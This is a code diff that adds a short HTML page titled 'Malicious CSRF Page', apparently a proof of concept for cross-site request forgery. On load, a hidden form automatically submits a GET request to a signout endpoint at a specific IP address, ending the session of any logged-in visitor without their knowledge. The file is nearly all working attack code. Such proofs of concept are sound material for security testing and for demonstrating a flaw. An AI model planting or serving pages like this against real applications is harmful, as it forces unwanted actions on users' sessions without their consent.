@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious CSRF Page</title>
+</head>
+<body>
+    <h1>Welcome to my Humble Aboad</h1>
+    <p>If you are logged into the target application, your session will be terminated automatically.</p>
+
+    <!-- Hidden form that submits a GET request to the signout endpoint automatically -->
+    <form id="csrfForm" action="https://140.245.27.133/signout" method="GET">
+    </form>
+    
+    <script>
+        // Automatically submit the form on page load
+        document.addEventListener("DOMContentLoaded", function() {
+            document.getElementById("csrfForm").submit();
+        });
+    </script>
+</body>
+</html>
